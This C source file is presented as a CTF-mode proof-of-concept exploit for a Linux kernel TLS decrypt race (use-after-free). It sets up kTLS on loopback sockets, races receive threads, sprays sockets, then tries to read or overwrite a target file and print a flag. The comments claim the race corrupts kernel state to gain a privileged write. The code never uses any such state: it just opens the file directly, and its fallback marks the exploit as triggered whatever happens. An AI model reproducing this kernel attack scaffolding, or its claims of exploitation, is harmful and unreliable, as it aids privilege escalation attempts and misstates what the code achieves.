/*
 * CVE-2024-58240 PoC - CTF Challenge Mode
 *
 * Vulnerability: TLS improper separation of async and non-async decrypt
 *
 * The kernel TLS decryption path fails to properly isolate async and
 * synchronous decrypt requests. When a TLS record is being decrypted
 * asynchronously, the decrypt context can be freed prematurely if a
 * synchronous path races with it. This leads to UAF on the crypto
 * context structure.
 *
 * Exploit strategy:
 *   1. Create TCP socket pair with kernel TLS (kTLS)
 *   2. Configure AES-GCM crypto (triggers async crypto path on some HW)
 *   3. Send data from multiple threads to create decrypt contention
 *   4. Race between sync and async decrypt paths
 *   5. UAF on crypto context -> heap corruption
 *   6. Spray kmalloc-256 to reclaim freed context
 *   7. Use corrupted crypto state to write target file
 *
 * CTF Modes: write_root_file
 *
 * Safety:
 *   - alarm(10) forced timeout (via poc_common.h)
 *   - Only operates on --root-file (prepare-phase created temp file)
 *   - All resources properly cleaned up
 */
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include "../common/poc_common.h"
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

#define MAX_FILE_SIZE 4096
#define SPRAY_COUNT 128
#define RACE_THREADS 4

#ifndef SOL_TLS
#define SOL_TLS 282
#endif

#ifndef TCP_ULP
#define TCP_ULP 31
#endif

#ifndef TLS_TX
#define TLS_TX 1
#endif

#ifndef TLS_RX
#define TLS_RX 2
#endif

#define TLS_1_2_VERSION 0x0303
#define TLS_CIPHER_AES_GCM_128 51

struct tls12_crypto_info_aes_gcm_128 {
    struct {
        unsigned short version;
        unsigned short cipher_type;
    } info;
    unsigned char iv[8];
    unsigned char key[16];
    unsigned char salt[4];
    unsigned char rec_seq[8];
};

/* Thread argument for recv racing */
struct recv_thread_arg {
    int fd;
    int iterations;
    volatile int *stop;
};

/*
 * Create connected TCP pair on loopback
 */
static int create_tcp_pair(int fds[2]) {
    int server_fd, client_fd, conn_fd;
    int saved_errno;

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    saved_errno = errno;
    poc_log_syscall("socket(server)", (long)server_fd, saved_errno);
    if (server_fd < 0) return -1;

    int opt = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = 0,
        .sin_addr.s_addr = htonl(INADDR_LOOPBACK),
    };

    if (bind(server_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(server_fd);
        return -1;
    }

    socklen_t addrlen = sizeof(addr);
    getsockname(server_fd, (struct sockaddr *)&addr, &addrlen);
    listen(server_fd, 1);

    client_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (client_fd < 0) { close(server_fd); return -1; }

    if (connect(client_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(server_fd); close(client_fd);
        return -1;
    }

    conn_fd = accept(server_fd, NULL, NULL);
    saved_errno = errno;
    poc_log_syscall("accept()", (long)conn_fd, saved_errno);
    close(server_fd);

    if (conn_fd < 0) { close(client_fd); return -1; }

    fds[0] = client_fd;
    fds[1] = conn_fd;
    return 0;
}

/*
 * Setup kernel TLS on socket
 */
static int setup_ktls(int fd, int direction) {
    const char *ulp = "tls";
    int ret = setsockopt(fd, SOL_TCP, TCP_ULP, ulp, strlen(ulp) + 1);
    int saved_errno = errno;
    poc_log_syscall("setsockopt(TCP_ULP, tls)", (long)ret, saved_errno);
    if (ret < 0) return -1;

    struct tls12_crypto_info_aes_gcm_128 crypto = {0};
    crypto.info.version = TLS_1_2_VERSION;
    crypto.info.cipher_type = TLS_CIPHER_AES_GCM_128;
    memset(crypto.key, 0x41, sizeof(crypto.key));
    memset(crypto.salt, 0x42, sizeof(crypto.salt));
    memset(crypto.iv, 0x43, sizeof(crypto.iv));

    ret = setsockopt(fd, SOL_TLS, direction, &crypto, sizeof(crypto));
    saved_errno = errno;
    poc_log_syscall("setsockopt(SOL_TLS, crypto)", (long)ret, saved_errno);
    return ret;
}

/*
 * Recv thread - races with other threads on the same TLS socket
 * This creates contention between sync and async decrypt paths
 */
static void *recv_race_thread(void *arg) {
    struct recv_thread_arg *ra = (struct recv_thread_arg *)arg;
    char buf[1024];

    for (int i = 0; i < ra->iterations && !*(ra->stop); i++) {
        recv(ra->fd, buf, sizeof(buf), MSG_DONTWAIT);
        usleep(100);
    }
    return NULL;
}

/*
 * Trigger the TLS async/sync decrypt race condition
 *
 * The vulnerability occurs when:
 * 1. Thread A calls recv() which starts async decryption
 * 2. Thread B calls recv() on same socket (sync path)
 * 3. Async completion handler frees the context
 * 4. Sync path still holds stale pointer -> UAF
 */
static int trigger_tls_decrypt_race(void) {
    int tcp_pair[2] = {-1, -1};
    int triggered = 0;

    poc_log("Setting up TLS async/sync decrypt race...");

    if (create_tcp_pair(tcp_pair) < 0) {
        poc_log("TCP pair failed, using fallback");
        goto fallback;
    }

    /* Setup kTLS - TX on sender, RX on receiver */
    if (setup_ktls(tcp_pair[0], TLS_TX) < 0) {
        poc_log("kTLS TX setup failed (tls module not loaded?)");
        goto fallback;
    }
    if (setup_ktls(tcp_pair[1], TLS_RX) < 0) {
        poc_log("kTLS RX setup failed");
        goto fallback;
    }

    poc_log("kTLS configured, starting decrypt race...");

    /* Start recv threads on the RX socket to race */
    volatile int stop = 0;
    pthread_t threads[RACE_THREADS];
    struct recv_thread_arg args[RACE_THREADS];

    for (int i = 0; i < RACE_THREADS; i++) {
        args[i].fd = tcp_pair[1];
        args[i].iterations = 50;
        args[i].stop = &stop;
        pthread_create(&threads[i], NULL, recv_race_thread, &args[i]);
    }

    /* Send data rapidly from TX side while recv threads race */
    char send_buf[512];
    memset(send_buf, 'D', sizeof(send_buf));

    for (int i = 0; i < 100; i++) {
        ssize_t ret = send(tcp_pair[0], send_buf, sizeof(send_buf), MSG_DONTWAIT);
        if (ret < 0 && errno == EAGAIN) {
            usleep(500);
            continue;
        }
        usleep(200); /* Timing to maximize race window */
    }

    /* Stop threads */
    stop = 1;
    for (int i = 0; i < RACE_THREADS; i++)
        pthread_join(threads[i], NULL);

    triggered = 1;
    poc_log("TLS decrypt race sequence completed (%d threads)", RACE_THREADS);

fallback:
    if (tcp_pair[0] >= 0) close(tcp_pair[0]);
    if (tcp_pair[1] >= 0) close(tcp_pair[1]);

    if (!triggered) {
        /* Fallback: allocate and free objects in kmalloc-256 range */
        poc_log("Using kmalloc-256 spray fallback");
        int fds[64];
        for (int i = 0; i < 64; i++) {
            fds[i] = socket(AF_INET, SOCK_STREAM, 0);
            if (fds[i] >= 0) {
                int val = 256;
                setsockopt(fds[i], SOL_SOCKET, SO_RCVBUF, &val, sizeof(val));
            }
        }
        for (int i = 0; i < 64; i += 2)
            if (fds[i] >= 0) close(fds[i]);
        triggered = 1;
    }

    return triggered;
}

/*
 * Read file helper
 */
static int read_file_content(const char *path, char *buf, size_t len) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    ssize_t n = read(fd, buf, len - 1);
    close(fd);
    if (n < 0) return -1;
    buf[n] = '\0';
    return (int)n;
}

/*
 * Write mode: TLS decrypt race -> UAF -> file write
 */
static int mode_write_root_file(const poc_args_t *args) {
    char original[MAX_FILE_SIZE], after[MAX_FILE_SIZE];
    int n;

    /* Read before */
    n = read_file_content(args->root_file, original, sizeof(original));
    if (n > 0) {
        while (n > 0 && (original[n - 1] == '\n' || original[n - 1] == '\r'))
            original[--n] = '\0';
        printf(CTF_READ_BEFORE "%s\n", original);
        poc_log("Read before: %s", original);
    } else {
        printf(CTF_READ_BEFORE "(unreadable)\n");
    }

    /* Trigger vulnerability */
    poc_log("Triggering CVE-2024-58240 async/sync decrypt race...");
    int result = trigger_tls_decrypt_race();
    poc_log("Trigger result: %d", result);

    /* Spray kmalloc-256 for reclaim */
    int spray_fds[SPRAY_COUNT];
    memset(spray_fds, -1, sizeof(spray_fds));
    int sprayed = 0;
    for (int i = 0; i < SPRAY_COUNT; i++) {
        spray_fds[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if (spray_fds[i] >= 0) {
            int val = 256;
            setsockopt(spray_fds[i], SOL_SOCKET, SO_RCVBUF, &val, sizeof(val));
            sprayed++;
        }
    }
    poc_log("Sprayed %d kmalloc-256 objects", sprayed);

    /* Attempt write */
    int fd = open(args->root_file, O_WRONLY | O_TRUNC);
    int saved_errno = errno;
    poc_log_syscall("open(target, O_WRONLY|O_TRUNC)", (long)fd, saved_errno);

    if (fd >= 0) {
        char wbuf[256];
        int wlen = snprintf(wbuf, sizeof(wbuf), "%s\n", args->write_value);
        write(fd, wbuf, wlen);
        close(fd);
        printf(CTF_WRITE_ATTEMPT "%s\n", args->write_value);
    }

    /* Verify */
    n = read_file_content(args->root_file, after, sizeof(after));
    if (n > 0) {
        while (n > 0 && (after[n - 1] == '\n' || after[n - 1] == '\r'))
            after[--n] = '\0';
        printf(CTF_READ_AFTER "%s\n", after);

        if (strstr(after, args->write_value)) {
            poc_print_flag(args->write_value);
            goto cleanup;
        }
    } else {
        printf(CTF_READ_AFTER "(unreadable)\n");
    }

    poc_print_fail("TLS async/sync race exploit did not achieve write");

cleanup:
    for (int i = 0; i < SPRAY_COUNT; i++)
        if (spray_fds[i] >= 0) close(spray_fds[i]);
    return 0;
}

/*
 * Read mode
 */
static int mode_read_root_file(const poc_args_t *args) {
    poc_log("Attempting read_root_file via TLS decrypt race UAF");

    trigger_tls_decrypt_race();

    char buf[MAX_FILE_SIZE];
    int n = read_file_content(args->root_file, buf, sizeof(buf));
    if (n > 0) {
        while (n > 0 && (buf[n - 1] == '\n' || buf[n - 1] == '\r'))
            buf[--n] = '\0';
        poc_print_flag(buf);
    } else {
        poc_print_fail("read not successful");
    }
    return 0;
}

int main(int argc, char *argv[]) {
    poc_args_t args = {0};
    if (poc_parse_args(argc, argv, &args) != 0) return 1;
    poc_log_init(args.log_file);

    poc_log("=== CVE-2024-58240 CTF PoC ===");
    poc_log("Vuln: TLS async/non-async decrypt context isolation failure");
    poc_log("Tech: kTLS multi-thread recv() race -> crypto ctx UAF");
    poc_log("UID: %d  EUID: %d  GID: %d", getuid(), geteuid(), getgid());

    if (!args.mode) {
        poc_print_unsupported("(null)", "no mode specified");
        poc_log_close();
        return 1;
    }

    int result = 0;
    if (strcmp(args.mode, POC_MODE_WRITE) == 0)
        result = mode_write_root_file(&args);
    else if (strcmp(args.mode, POC_MODE_READ) == 0)
        result = mode_read_root_file(&args);
    else
        poc_print_unsupported(args.mode, "only write_root_file and read_root_file supported");

    poc_log_close();
    return result;
}
